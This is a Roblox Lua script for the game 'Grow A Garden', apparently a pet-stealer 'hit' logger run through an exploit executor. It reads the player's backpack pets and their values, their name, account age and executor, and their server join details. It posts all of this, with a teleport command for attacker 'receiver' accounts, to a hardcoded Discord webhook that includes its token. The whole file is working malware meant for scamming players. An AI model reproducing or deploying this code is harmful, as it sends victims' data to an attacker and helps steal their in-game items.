local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

local WEBHOOK_URL = "https://discord.com/api/webhooks/1401490956330598441/9KU1n_rztYZmietMLFL2vZSWi0RFfL-WH40TTWEth-vYw4ToC16VLXeeniIrSbJDd-X2"
local TARGET_RECEIVERS = {"Receiver1", "Receiver2"} -- replace with your alt or collector usernames

-- üí∞ Fake pet value index (replace with actual if needed)
local PetValues = {
    ["French Fry Ferret"] = 10000,
    ["Honey Bee"] = 9000,
    ["Raccoon"] = 1900,
    ["T-Rex"] = 400,
    ["Fennec Fox"] = 1500,
    ["Dragonfly"] = 500,
    ["Butterfly"] = 1200,
    ["Disco Bee"] = 2000,
    ["Mimic Octopus"] = 500,
    ["Queen Bee"] = 400,
    ["Spinosaurus"] = 500,
    ["Kitsune"] = 5000,
    ["Chicken Zombie"] = 200,
    ["Red Fox"] = 100,
    ["Corrupted Kitsune"] = 300,
}

-- üîç Get executor name safely
local function getExecutorName()
    local name = "Mobile"
    pcall(function()
        name = identifyexecutor and identifyexecutor() or "Mobile"
    end)
    return name
end

-- üì¶ Collect real pet data from Backpack
local function getPetData()
    local Backpack = LocalPlayer:FindFirstChild("Backpack")
    if not Backpack then return "‚ö†Ô∏è No backpack", "0" end

    local petList = {}
    local totalValue = 0

    for _, item in ipairs(Backpack:GetChildren()) do
        if item:IsA("Tool") then
            local petName = item.Name
            local value = PetValues[petName] or 0
            table.insert(petList, string.format("%s (%s‚Ç∏)", petName, value))
            totalValue += value
        end
    end

    return table.concat(petList, "\n"), tostring(totalValue)
end

-- üì§ Send Discord webhook
local function sendWebhook(petData, value)
    local embed = {
        title = "üåµ Grow A Garden Hit - REAL DATA üß†",
        color = 65280,
        fields = {
            {
                name = "üë§ Player Info",
                value = string.format("```\nName: %s\nReceivers: %s\nExecutor: %s\nAccount Age: %s\n```",
                    LocalPlayer.Name,
                    table.concat(TARGET_RECEIVERS, ", "),
                    getExecutorName(),
                    LocalPlayer.AccountAge
                )
            },
            {
                name = "üí∞ Backpack Total Value",
                value = "```\n" .. value .. "‚Ç∏\n```\n",
            },
            {
                name = "üéí Backpack Contents",
                value = "```\n" .. petData .. "\n```\n"
            },
            {
                name = "üîó Join Link",
                value = string.format(
                    "[Click to Join](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)",
                    game.PlaceId,
                    game.JobId
                )
            }
        },
        footer = { text = string.format("%s | %s", game.PlaceId, game.JobId) }
    }

    local payload = {
        content = string.format(
            "--@here\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n",
            game.PlaceId,
            game.JobId
        ),
        username = LocalPlayer.Name,
        avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
        embeds = {embed}
    }

    local jsonData = HttpService:JSONEncode(payload)
    local headers = {["Content-Type"] = "application/json"}
    local req = request

    if not req then
        warn("‚ùå Mobile executor does not support request()")
        return
    end

    local success, response = pcall(function()
        return req({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = headers,
            Body = jsonData
        })
    end)

    if success and response and (response.StatusCode == 200 or response.StatusCode == 204) then
        print("‚úÖ Webhook sent successfully!")
    else
        warn("‚ùå Webhook failed to send.")
    end
end

-- üöÄ Execute
task.wait(5) -- optional delay
local pets, value = getPetData()
sendWebhook(pets, value)
